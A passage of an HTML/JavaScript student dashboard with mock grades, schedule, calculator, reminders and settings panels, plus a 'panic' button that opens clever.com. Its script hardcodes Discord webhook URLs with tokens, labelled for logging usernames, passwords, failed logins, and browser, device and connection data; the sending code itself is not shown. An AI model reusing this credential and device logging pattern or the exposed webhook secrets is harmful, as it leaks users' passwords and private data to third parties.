      <!-- Grades Viewer Panel -->
      <div id="gradesViewerPanel" class="info-panel">
        <h2>💯 Grades Viewer</h2>
        <div class="info-text">
          <h3>Current Mock Grades:</h3>
          <ul>
            <li><strong>English 8:</strong> A- (91%)</li>
            <li><strong>Algebra I:</strong> B+ (88%)</li>
            <li><strong>Science 8:</strong> A (95%)</li>
            <li><strong>Social Studies 8:</strong> B (84%)</li>
            <li><strong>Art:</strong> A+ (98%)</li>
            <li><strong>Physical Education:</strong> A (93%)</li>
          </ul>
          <p>Grades are dynamically loaded from a mock student information system.</p>
        </div>
        <div class="links-list" style="margin-top: 15px;">
          <a href="https://powerschool.raiderweb.org/public/" target="_blank">Access Live PowerSchool (External)</a>
          <a href="https://studentvue.middletown.org" target="_blank">Access Live StudentVUE (External)</a>
        </div>
        <div class="coming-soon" style="margin-top: 15px;">
          Direct Grade Integration and Trend Analysis Coming Soon - ETA Mid 2026.
        </div>
      </div>

      <!-- Class Schedule Panel -->
      <div id="classSchedulePanel" class="info-panel">
        <h2>🗓️ Class Schedule</h2>
        <div class="info-text">
          <h3>Current Day's Mock Schedule (Friday):</h3>
          <p><strong>Period 1:</strong> 7:45 AM - 8:30 AM | English 8 | Room 201</p>
          <p><strong>Period 2:</strong> 8:35 AM - 9:20 AM | Algebra I | Room 115</p>
          <p><strong>Period 3:</strong> 9:25 AM - 10:10 AM | Science 8 | Lab 305</p>
          <p><strong>Homeroom:</strong> 10:15 AM - 10:25 AM | Room 201</p>
          <p><strong>Lunch:</strong> 10:25 AM - 10:55 AM | Cafeteria</p>
          <p><strong>Period 4:</strong> 11:00 AM - 11:45 AM | Social Studies 8 | Room 207</p>
          <p><strong>Period 5:</strong> 11:50 AM - 12:35 PM | Art | Art Studio</p>
          <p><strong>Period 6:</strong> 12:40 PM - 1:25 PM | Physical Education | Gym</p>
          <p><strong>Period 7:</strong> 1:30 PM - 2:30 PM | Independent Study / Study Hall | Library</p>
        </div>
        <div class="coming-soon" style="margin-top: 15px;">
          Personalized Interactive Schedule with Alerts Coming Soon.
        </div>
      </div>

      <!-- Calculator Panel -->
      <div id="calculatorPanel" class="info-panel">
        <h2>🧮 Calculator Tool</h2>
        <div class="info-text calculator">
          <div class="calculator-output" id="calculatorOutput">0</div>
          <div class="calculator-grid">
            <button onclick="dashboard.calculator.clear()">AC</button>
            <button onclick="dashboard.calculator.backspace()">DEL</button>
            <button class="operator" onclick="dashboard.calculator.appendOperator('%')">%</button>
            <button class="operator" onclick="dashboard.calculator.appendOperator('/')">/</button>

            <button onclick="dashboard.calculator.appendNumber('7')">7</button>
            <button onclick="dashboard.calculator.appendNumber('8')">8</button>
            <button onclick="dashboard.calculator.appendNumber('9')">9</button>
            <button class="operator" onclick="dashboard.calculator.appendOperator('*')">*</button>

            <button onclick="dashboard.calculator.appendNumber('4')">4</button>
            <button onclick="dashboard.calculator.appendNumber('5')">5</button>
            <button onclick="dashboard.calculator.appendNumber('6')">6</button>
            <button class="operator" onclick="dashboard.calculator.appendOperator('-')">-</button>

            <button onclick="dashboard.calculator.appendNumber('1')">1</button>
            <button onclick="dashboard.calculator.appendNumber('2')">2</button>
            <button onclick="dashboard.calculator.appendNumber('3')">3</button>
            <button class="operator" onclick="dashboard.calculator.appendOperator('+')">+</button>

            <button class="span-2" onclick="dashboard.calculator.appendNumber('0')">0</button>
            <button onclick="dashboard.calculator.appendNumber('.')">.</button>
            <button class="equal" onclick="dashboard.calculator.compute()">=</button>
          </div>
        </div>
      </div>

      <!-- Reminder System Panel -->
      <div id="remindersPanel" class="info-panel">
        <h2>⏰ Reminder System</h2>
        <div class="info-text">
          <p>Manage your upcoming and past reminders here.</p>
          <button id="addReminderBtn">➕ Add New Reminder</button>
          <div style="margin-top: 20px;">
            <h3>Your Active Reminders:</h3>
            <ul id="activeRemindersList" style="list-style: none; padding: 0;">
              <li>No active reminders.</li>
            </ul>
            <h3 style="margin-top: 20px;">Completed Reminders:</h3>
            <ul id="completedRemindersList" style="list-style: none; padding: 0; opacity: 0.7;">
              <li>No completed reminders.</li>
            </ul>
          </div>
        </div>
      </div>

      <!-- Add Reminder Modal -->
      <div id="addReminderModal" class="modal-overlay">
        <div class="modal-content">
          <span class="close-button" id="closeReminderModalBtn">&times;</span>
          <h2>Add New Reminder</h2>
          <label for="reminderTitle">Title:</label>
          <input type="text" id="reminderTitle" placeholder="e.g., Submit project, Study for test" />

          <label for="reminderDate">Date:</label>
          <input type="date" id="reminderDate" />

          <label for="reminderTime">Time:</label>
          <input type="time" id="reminderTime" />

          <label for="reminderDescription">Description (Optional):</label>
          <textarea id="reminderDescription" rows="3" placeholder="Additional details for your reminder..."></textarea>

          <button id="saveReminderBtn">Save Reminder</button>
        </div>
      </div>

      <!-- Resource Library Panel -->
      <div id="resourceLibraryPanel" class="info-panel">
        <h2>📚 Resource Library</h2>
        <div class="info-text">
          <p>Access various educational resources and online learning platforms.</p>
        </div>
        <div class="links-list">
          <a href="https://www.khanacademy.org" target="_blank">Khan Academy</a>
          <a href="https://www.duolingo.com" target="_blank">Duolingo</a>
          <a href="https://quizizz.com" target="_blank">Quizizz</a>
          <a href="https://www.edpuzzle.com" target="_blank">Edpuzzle</a>
          <a href="https://www.codecademy.com" target="_blank">Codecademy</a>
          <a href="https://www.geogebra.org" target="_blank">GeoGebra (Math)</a>
          <a href="https://www.gimkit.com" target="_blank">Gimkit</a>
          <a href="https://www.quizlet.com" target="_blank">Quizlet</a>
          <a href="https://www.newsela.com" target="_blank">Newsela (Literacy)</a>
          <a href="https://www.prodigygame.com" target="_blank">Prodigy Game (Math)</a>
          <a href="https://www.britannica.com" target="_blank">Encyclopedia Britannica</a>
          <a href="https://www.ck12.org" target="_blank">CK-12 Foundation (Science/Math)</a>
        </div>
      </div>

      <!-- AI Assistant Panel -->
      <div id="aiAssistantPanel" class="info-panel">
        <h2>🧠 AI Assistant (Beta)</h2>
        <div class="info-text">
          <p>This is a mock AI Assistant interface. Full conversational capabilities are under development.</p>
          <div style="background: #3a3a3a; padding: 15px; border-radius: 8px; margin-top: 15px; max-height: 250px; overflow-y: auto;">
            <p><strong>Assistant:</strong> Hello! How can I assist you today?</p>
            <p><strong>You:</strong> What is the quadratic formula?</p>
            <p><strong>Assistant:</strong> The quadratic formula is: x = [-b ± sqrt(b² - 4ac)] / 2a. It is used to solve quadratic equations of the form ax² + bx + c = 0.</p>
            <p><strong>You:</strong> Summarize the main points of the French Revolution.</p>
            <p><strong>Assistant:</strong> (processing...)</p>
          </div>
          <div style="display: flex; gap: 10px; margin-top: 15px;">
            <input type="text" placeholder="Ask your question here..." style="flex-grow: 1;">
            <button>Ask AI</button>
          </div>
        </div>
        <div class="coming-soon" style="margin-top: 15px;">
          Advanced AI Integration with Voice Command Coming Soon.
        </div>
      </div>

      <!-- FAQ / Help Panel -->
      <div id="faqPanel" class="info-panel">
        <h2>❓ FAQ / Help</h2>
        <div class="info-text">
          <h3>Frequently Asked Questions:</h3>
          <h4>Q: How do I change my password?</h4>
          <p>A: Access the "Settings" panel and navigate to the "Privacy & Security" section to manage your account credentials.</p>
          <h4>Q: My dashboard theme is wrong, how to fix it?</h4>
          <p>A: Use the "Theme Toggle" button in the quick bar or go to "Settings" > "Appearance Settings" to change your theme.</p>
          <h4>Q: Where can I find information about school closures?</h4>
          <p>A: School closure announcements are typically broadcast via the "Announcement Bar", "School News Feed", and district-wide messaging systems.</p>
          <h4>Q: Can I suggest new features for this dashboard?</h4>
          <p>A: Absolutely! Please visit the school's IT support portal (link under "Student Websites") and submit your suggestions.</p>
        </div>
        <div class="links-list" style="margin-top: 15px;">
          <a href="https://masd.happyfox.com/home/" target="_blank">IT Help Desk (HappyFox)</a>
          <a href="mailto:support@raiderweb.org">Email Support</a>
        </div>
      </div>

      <!-- Password Generator Panel -->
      <div id="passwordGeneratorPanel" class="info-panel">
        <h2>🔑 Password Generator</h2>
        <div class="info-text">
          <p>Generate strong, secure passwords.</p>
          <div id="passwordGeneratorResult">Click 'Generate Password'</div>
          <div id="passwordGeneratorControls">
            <div class="password-settings-item">
              <label for="passwordLength">Length:</label>
              <input type="range" id="passwordLength" min="8" max="64" value="16">
              <span id="passwordLengthValue">16</span>
            </div>
            <div class="password-settings-grid">
              <div class="password-settings-item">
                <label for="includeUppercase">Uppercase (A-Z)</label>
                <label class="switch">
                  <input type="checkbox" id="includeUppercase" checked>
                  <span class="slider"></span>
                </label>
              </div>
              <div class="password-settings-item">
                <label for="includeLowercase">Lowercase (a-z)</label>
                <label class="switch">
                  <input type="checkbox" id="includeLowercase" checked>
                  <span class="slider"></span>
                </label>
              </div>
              <div class="password-settings-item">
                <label for="includeNumbers">Numbers (0-9)</label>
                <label class="switch">
                  <input type="checkbox" id="includeNumbers" checked>
                  <span class="slider"></span>
                </label>
              </div>
              <div class="password-settings-item">
                <label for="includeSymbols">Symbols (!@#)</label>
                <label class="switch">
                  <input type="checkbox" id="includeSymbols" checked>
                  <span class="slider"></span>
                </label>
              </div>
            </div>
            <button id="generatePasswordBtn">Generate Password</button>
            <button id="copyPasswordBtn" style="background-color: #28a745;">Copy Password</button>
          </div>
        </div>
      </div>

      <!-- Unit Converter Panel -->
      <div id="unitConverterPanel" class="info-panel">
          <h2>📏 Unit Converter</h2>
          <div class="info-text">
              <p>Convert values between different units.</p>
              <div class="unit-converter-grid">
                  <div class="unit-converter-input-group">
                      <label for="conversionType">Type:</label>
                      <select id="conversionType">
                          <option value="length">Length</option>
                          <option value="weight">Weight</option>
                          <option value="temperature">Temperature</option>
                          <option value="volume">Volume</option>
                          <option value="area">Area</option>
                          <option value="speed">Speed</option>
                      </select>
                  </div>
                  <div class="unit-converter-input-group">
                      <label for="fromValue">Value:</label>
                      <input type="number" id="fromValue" value="1">
                  </div>
                  <div class="unit-converter-input-group">
                      <label for="fromUnit">From:</label>
                      <select id="fromUnit"></select>
                  </div>
                  <div class="unit-converter-input-group">
                      <label for="toUnit">To:</label>
                      <select id="toUnit"></select>
                  </div>
              </div>
              <div class="unit-converter-result" id="conversionResult"></div>
              <button style="margin-top: 15px;" id="convertUnitBtn">Convert</button>
          </div>
      </div>

      <!-- Settings Panel -->
      <div id="settingsPanel" class="info-panel">
        <h2>⚙️ System Settings</h2>

        <div class="settings-section">
          <h3>General Settings</h3>
          <div class="settings-item">
            <label>Logged In User:</label>
            <span><span id="settingsUsername">Beta.user</span> (<span id="settingsUserID">281573</span>)</span>
            <button onclick="dashboard.settings.mockProfileEdit()" style="background-color: #007bff;">Edit Profile</button>
          </div>
          <div class="settings-item">
            <label for="languageSelect">Language:</label>
            <select id="languageSelect">
              <option value="en">English (US)</option>
              <option value="es">Español</option>
              <option value="fr">Français</option>
            </select>
          </div>
          <div class="settings-item">
              <label for="sessionTimeoutSelect">Auto Logout Timer:</label>
              <select id="sessionTimeoutSelect">
                  <option value="0">Never</option>
                  <option value="15">15 Minutes</option>
                  <option value="30">30 Minutes</option>
                  <option value="60">1 Hour</option>
              </select>
          </div>
        </div>

        <div class="settings-section">
          <h3>Appearance Settings</h3>
          <div class="settings-item">
            <label for="themeSelector">Dashboard Theme:</label>
            <select id="themeSelector">
              <option value="dark">Dark Mode</option>
              <option value="light">Light Mode</option>
            </select>
          </div>
          <div class="settings-item">
            <label for="accentColorPicker">Accent Color:</label>
            <input type="color" id="accentColorPicker" value="#ff914d">
            <button onclick="dashboard.settings.setAccentColor()">Apply Accent</button>
          </div>
          <div class="settings-item">
            <label for="fontSizeSlider">Base Font Size:</label>
            <input type="range" id="fontSizeSlider" min="12" max="20" value="16">
            <span id="fontSizeValue" class="font-size-value">16px</span>
          </div>
          <div class="settings-item">
              <label for="animationSpeedSelect">Animation Speed:</label>
              <select id="animationSpeedSelect">
                  <option value="normal">Normal</option>
                  <option value="fast">Fast</option>
                  <option value="slow">Slow</option>
              </select>
          </div>
        </div>

        <div class="settings-section">
          <h3>Notification Settings</h3>
          <div class="settings-item">
            <label for="enablePanelNotifications">Panel Open Notifications:</label>
            <label class="switch">
              <input type="checkbox" id="enablePanelNotifications" checked>
              <span class="slider"></span>
            </label>
          </div>
          <div class="settings-item">
            <label for="enableReminderNotifications">Reminder Alerts:</label>
            <label class="switch">
              <input type="checkbox" id="enableReminderNotifications" checked>
              <span class="slider"></span>
            </label>
          </div>
          <div class="settings-item">
              <label for="enableUpdateNotifications">Show Update Pop-ups:</label>
              <label class="switch">
                <input type="checkbox" id="enableUpdateNotifications" checked>
                <span class="slider"></span>
              </label>
          </div>
          <div class="settings-item">
              <label for="notificationSoundToggle">Play Notification Sound:</label>
              <label class="switch">
                <input type="checkbox" id="notificationSoundToggle">
                <span class="slider"></span>
              </label>
          </div>
        </div>

        <div class="settings-section">
          <h3>Reminder System Settings</h3>
          <div class="settings-item">
            <label for="reminderSoundSelect">Reminder Alert Sound:</label>
            <select id="reminderSoundSelect">
              <option value="default">Default Beep</option>
              <option value="alert">Alarm Bell</option>
              <option value="chime">Gentle Chime</option>
              <option value="none">None</option>
            </select>
          </div>
          <div class="settings-item">
            <label for="autoDismissReminders">Auto-Dismiss after 5s:</label>
            <label class="switch">
              <input type="checkbox" id="autoDismissReminders" checked>
              <span class="slider"></span>
            </label>
          </div>
          <div class="settings-item">
              <label>Clear All Completed Reminders:</label>
              <button onclick="dashboard.reminders.clearAllCompleted()" style="background-color: #ffc107;">Clear Completed</button>
          </div>
        </div>

        <div class="settings-section">
          <h3>Privacy & Security</h3>
          <div class="settings-item">
            <label>Change Password:</label>
            <button onclick="dashboard.settings.mockPasswordChange()" style="background-color: #ff9800;">Change Password</button>
          </div>
          <div class="settings-item">
            <label for="twoFactorAuth">Two-Factor Authentication:</label>
            <label class="switch">
              <input type="checkbox" id="twoFactorAuth">
              <span class="slider"></span>
            </label>
            <button onclick="dashboard.settings.mockSetup2FA()" style="background-color: #007bff;">Setup</button>
          </div>
          <div class="settings-item">
              <label>Clear Local Cache/Data:</label>
              <button onclick="dashboard.settings.clearCache()" style="background-color: #dc3545;">Clear Now</button>
          </div>
        </div>

        <div class="settings-section">
          <h3>Advanced</h3>
          <div class="settings-item">
            <label for="devModeToggle">Developer Mode:</label>
            <label class="switch">
              <input type="checkbox" id="devModeToggle">
              <span class="slider"></span>
            </label>
            <button onclick="dashboard.settings.mockDeveloperConsole()" style="background-color: #6c757d;">Open Console</button>
          </div>
          <div class="settings-item">
            <label>Reset All Settings to Default:</label>
            <button onclick="dashboard.settings.resetToDefault()" style="background-color: #f8f9fa; color: #333;">Reset Defaults</button>
          </div>
          <div class="settings-item">
              <label>Export User Data/Settings:</label>
              <button onclick="dashboard.settings.exportSettings()" style="background-color: #17a2b8;">Export Data</button>
          </div>
        </div>
      </div>

    </div>

    <div id="canvasContainer">
      <h2>🖌️ Notes Canvas</h2>
      <canvas id="notesCanvas" width="800" height="600"></canvas> <!-- Increased size -->
      <div id="canvasControls">
        <button id="clearCanvasBtn">Clear Canvas</button>
        <button id="closeCanvasBtn">Close Notes</button>
      </div>
    </div>
  </div>

  <div id="notificationContainer"></div> <!-- Container for toast notifications -->

  <script>
    // Constants for Webhook URLs - Kept as provided
    const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

    const loggingWebhooks = {
      username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
      password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
      identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjff1Oj7Ce9c02cA',
      invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTpPMT9MooblezpxJLqDA97jIUShkp',
      invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
      invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
      attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHjGG39lC6YRZ_1aw',
      attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
    };

    const webhookUrls = {
      userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
      browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnjOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
      deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
      connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
      sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
    };

    const RESET_CODE = 'Reset.Counter.2579'; // Global reset code

    // Dashboard functionality object
    const dashboard = {
      // Configuration for dashboard
      config: {
        enablePanelNotifications: true,
        enableReminderNotifications: true,
        enableUpdateNotifications: true,
        notificationSoundEnabled: false,
        theme: 'dark',
        accentColor: '#ff914d',
        fontSize: '16px',
        animationSpeed: 'normal', // 'normal', 'fast', 'slow'
        autoDismissReminders: true,
        reminderSound: 'default'
      },

      init: function() {
        this.loadSettings();
        this.applySettings(); // Apply theme, font size etc.
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initQuickBarButtons(); // All buttons in the quick-bar
        this.initCanvas();
        this.initPanels(); // Hides all info-panels by default
        this.initUtilityButtons(); // Handles all the new toggleable info panel buttons
        this.reminders.init(); // Initialize reminder system
        this.calculator.init(); // Initialize calculator
        this.passwordGenerator.init(); // Init password generator
        this.unitConverter.init(); // Init unit converter
        this.settings.init(); // Init settings panel logic
      },

      loadSettings: function() {
        try {
          const savedSettings = JSON.parse(localStorage.getItem('dashboardSettings'));
          if (savedSettings) {
            Object.assign(this.config, savedSettings);
          }
        } catch (e) {
          console.warn("Could not load settings from localStorage, using defaults.", e);
        }
      },

      saveSettings: function() {
        try {
          localStorage.setItem('dashboardSettings', JSON.stringify(this.config));
        } catch (e) {
          console.error("Failed to save settings to localStorage.", e);
        }
      },

      applySettings: function() {
        // Apply theme
        document.body.className = `dashboard-body ${this.config.theme}-theme`;
        document.getElementById('themeToggle').innerText = this.config.theme === 'dark' ? '🌙 Dark Mode' : '☀️ Light Mode';

        // Apply font size
        document.documentElement.style.setProperty('--base-font-size', this.config.fontSize);
        document.getElementById('fontSizeSlider').value = parseInt(this.config.fontSize);
        document.getElementById('fontSizeValue').textContent = this.config.fontSize;


        // Apply accent color (used by dark theme primary, and light theme secondary by default in CSS)
        document.documentElement.style.setProperty('--dark-accent-color', this.config.accentColor);
        // If a light-theme specific accent is also desired:
        // document.documentElement.style.setProperty('--light-accent-color', this.config.accentColor);
        document.getElementById('accentColorPicker').value = this.config.accentColor; // Set picker to current value


        // Update notification settings UI
        document.getElementById('enablePanelNotifications').checked = this.config.enablePanelNotifications;
        document.getElementById('enableReminderNotifications').checked = this.config.enableReminderNotifications;
        document.getElementById('enableUpdateNotifications').checked = this.config.enableUpdateNotifications;
        document.getElementById('notificationSoundToggle').checked = this.config.notificationSoundEnabled;
        document.getElementById('autoDismissReminders').checked = this.config.autoDismissReminders;
        document.getElementById('reminderSoundSelect').value = this.config.reminderSound;

        // Apply animation speed (mockup, would require complex CSS/JS variable manipulation)
        // For now, this is primarily a setting to be "applied" by notification.
        document.getElementById('animationSpeedSelect').value = this.config.animationSpeed;
      },

      // Global notification display function
      showNotification: function(message, type = 'info', duration = 4000) {
        if (!this.config.enablePanelNotifications && !message.includes("reminder alert!")) { // Don't block reminder alerts
            return;
        }
        if (!this.config.enableReminderNotifications && message.includes("reminder alert!")) {
            return;
        }
        if (!this.config.enableUpdateNotifications && message.includes("update:")) { // Simple check for update messages
            return;
        }


        const container = document.getElementById('notificationContainer');
        const toast = document.createElement('div');
        toast.classList.add('notification-toast');
        toast.classList.add(type); // 'info', 'success', 'warning', 'error'

        const timestamp = new Date().toLocaleTimeString();
        toast.innerHTML = `<strong>(${timestamp})</strong> ${message}`;

        container.appendChild(toast);

        // Animate in
        setTimeout(() => toast.classList.add('show'), 10);

        // Play sound if enabled and not for certain types
        if (this.config.notificationSoundEnabled) {
          if (message.includes("reminder alert!")) {
            if (this.config.reminderSound !== 'none') {
                this.playSound(this.config.reminderSound);
            }
          } else if (type === 'success') {
            this.playSound('chime');
          } else if (type === 'error' || type === 'warning') {
            this.playSound('alert');
          } else {
            this.playSound('default');
          }
        }


        // Add to recent notifications in the dashboard UI
        this.addRecentNotification(message);

        const dismissAfter = (message.includes("reminder alert!") && this.config.autoDismissReminders) ? 5000 : duration;

        if (dismissAfter > 0) { // Only auto-dismiss if duration is not 0
            setTimeout(() => {
                toast.classList.remove('show');
                toast.addEventListener('transitionend', () => toast.remove());
            }, dismissAfter);
        }

        toast.addEventListener('click', () => {
          toast.classList.remove('show');
          toast.addEventListener('transitionend', () => toast.remove());
        });
      },

      playSound: function(soundType = 'default') {
        const audio = new Audio();
        if (soundType === 'alert') {
            audio.src = 'https://assets.mixkit.co/sfx/preview/mixkit-scanner-alert-972.mp3';
        } else if (soundType === 'chime') {
            audio.src = 'https://assets.mixkit.co/sfx/preview/mixkit-game-click-1769.mp3';
        } else { // Default beep
            audio.src = 'https://assets.mixkit.co/sfx/preview/mixkit-software-interface-essential-click-550.mp3';
        }
        audio.play().catch(e => console.warn("Failed to play notification sound:", e));
      },

      addRecentNotification: function(message) {
          const notificationList = document.getElementById('notificationList');
          if (notificationList) {
              const listItem = document.createElement('li');
              listItem.textContent = message;
              if (notificationList.children.length >= 5) { // Keep list to 5 items max
                  notificationList.removeChild(notificationList.lastChild);
              }
              notificationList.prepend(listItem);
          }
      },

      initSessionTimer: function() {
        let sessionSeconds = 0;
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }

        function updateSessionTime() {
          sessionSeconds++;
          document.getElementById('sessionTime').innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
        }

        updateSessionTime();
        setInterval(updateSessionTime, 1000);
        document.getElementById('sessionTime').addEventListener('click', () => this.showNotification('Session Time updated.'));
      },

      initClock: function() {
        function updateClock() {
          const now = new Date();
          const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
          const timeStr = now.toLocaleTimeString(undefined, options);
          const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

          document.getElementById('realTimeClock').innerText = '🕒 ' + timeStr;
          document.getElementById('realDate').innerText = '📅 ' + dateStr;
        }

        updateClock();
        setInterval(updateClock, 1000);
        document.getElementById('realTimeClock').addEventListener('click', () => this.showNotification('Real Time Clock refreshed.'));
        document.getElementById('realDate').addEventListener('click', () => this.showNotification('Real Date refreshed.'));
      },

      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        calendar.innerHTML = '';
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
      },

      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        themeBtn.addEventListener('click', () => {
          if (document.body.classList.contains('light-theme')) {
            document.body.classList.remove('light-theme');
            document.body.classList.add('dark-theme');
            this.config.theme = 'dark';
            themeBtn.innerText = '🌙 Dark Mode';
            this.showNotification('Switched to Dark Mode.');
          } else {
            document.body.classList.remove('dark-theme');
            document.body.classList.add('light-theme');
            this.config.theme = 'light';
            themeBtn.innerText = '☀️ Light Mode';
            this.showNotification('Switched to Light Mode.');
          }
          this.saveSettings();
          document.getElementById('themeSelector').value = this.config.theme; // Sync settings UI
        });
      },

      // Refactored to handle all quick bar buttons
      initQuickBarButtons: function() {
          const quickBarButtons = document.querySelectorAll('.quick-bar button');
          quickBarButtons.forEach(button => {
              const buttonText = button.textContent.replace(/[\uD800-\uDFFF].\s*/, '').trim(); // Remove emojis and extra space for notification
              // Handled by specific event listeners: sessionTime, realTimeClock, realDate, themeToggle
              if (button.id === 'sessionTime' || button.id === 'realTimeClock' || button.id === 'realDate' || button.id === 'themeToggle' || button.id === 'notesBtn' || button.id === 'exportNotesBtn' || button.id === 'screenshotBtn' || button.id === 'toggleSectionsBtn') {
                  // Do nothing here, these are handled elsewhere or below explicitly.
              } else if (button.id === 'panicBtn') {
                  button.addEventListener('click', () => {
                      window.open('https://clever.com', '_blank');
                      this.showNotification(`Clicked: ${buttonText}`);
                  });
              } else if (button.id === 'restartBtn') {
                  button.addEventListener('click', () => {
                      if (confirm('Are you sure you want to kill the page (restart)?')) {
                          document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Restart to continue.</div>`;
                      }
                      this.showNotification(`Clicked: ${buttonText}`);
                  });
              } else if (button.id === 'fixIssuesBtn') {
                  button.addEventListener('click', () => {
                      alert('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!');
                      this.showNotification(`Clicked: ${buttonText}`);
                  });
              } else if (button.id === 'fullScreenBtn') {
                  button.addEventListener('click', () => {
                      if (!document.fullscreenElement) {
                          document.documentElement.requestFullscreen().catch(err => {
                              alert(`Error attempting to enable full-screen mode: ${err.message}`);
                          });
                      } else {
                          document.exitFullscreen();
                      }
                      this.showNotification(`Clicked: ${buttonText}`);
                  });
              } else if (button.id === 'zoomInBtn') {
                  button.addEventListener('click', () => {
                      let zoomLevel = parseFloat(document.body.style.zoom || 1);
                      if (zoomLevel < 2) {
                          zoomLevel += 0.1;
                          document.body.style.zoom = zoomLevel;
                      }
                      this.showNotification(`Clicked: ${buttonText}. Zoom Level: ${Math.round(zoomLevel * 100)}%`);
                  });
              } else if (button.id === 'zoomOutBtn') {
                  button.addEventListener('click', () => {
                      let zoomLevel = parseFloat(document.body.style.zoom || 1);
                      if (zoomLevel > 0.5) {
                          zoomLevel -= 0.1;
                          document.body.style.zoom = zoomLevel;
                      }
                      this.showNotification(`Clicked: ${buttonText}. Zoom Level: ${Math.round(zoomLevel * 100)}%`);
                  });
              } else if (button.id === 'logoutBtn') {
                button.addEventListener('click', () => {
                  if (confirm('Are you sure you want to log out?')) {
                    this.logoutUser();
                  }
                  this.showNotification(`Clicked: ${buttonText}`);
                });
              }
          });
      },

      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid');
        const updatesNotifications = document.getElementById('updatesNotifications');
        const infoPanelsContainer = document.getElementById('infoPanelsContainer');

        notesBtn.addEventListener('click', () => {
          mainGrid.style.display = 'none';
          updatesNotifications.style.display = 'none';
          infoPanelsContainer.style.display = 'none';
          canvasContainer.style.display = 'block';
          this.showNotification('Clicked: Notes (Canvas opened).');
        });

        document.getElementById('closeCanvasBtn').addEventListener('click', () => {
          canvasContainer.style.display = 'none';
          mainGrid.style.display = 'flex';
          updatesNotifications.style.display = 'flex';
          infoPanelsContainer.style.display = 'block'; // Or toggle based on previous state
          this.showNotification('Clicked: Close Notes (Canvas closed).');
        });

        const clearCanvasBtn = document.getElementById('clearCanvasBtn');
        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');

        // Draw initial white background
        ctx.fillStyle = '#fff';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        let drawing = false;

        function getPos(evt) {
          const rect = canvas.getBoundingClientRect();
          const scaleX = canvas.width / rect.width;
          const scaleY = canvas.height / rect.height;
          return {
            x: ((evt.clientX || evt.touches[0].clientX) - rect.left) * scaleX,
            y: ((evt.clientY || evt.touches[0].clientY) - rect.top) * scaleY
          };
        }

        canvas.addEventListener('mousedown', (e) => {
          drawing = true;
          const pos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(pos.x, pos.y);
          e.preventDefault();
        });

        canvas.addEventListener('touchstart', (e) => {
          drawing = true;
          const pos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(pos.x, pos.y);
